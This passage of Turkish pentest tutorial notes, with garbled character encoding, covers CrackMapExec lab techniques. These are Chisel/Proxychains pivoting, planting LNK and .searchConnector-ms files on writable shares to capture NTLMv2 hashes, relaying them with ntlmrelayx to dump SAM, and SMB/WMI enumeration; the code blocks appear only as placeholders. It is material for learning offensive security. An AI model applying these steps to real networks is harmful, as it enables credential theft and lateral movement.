Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

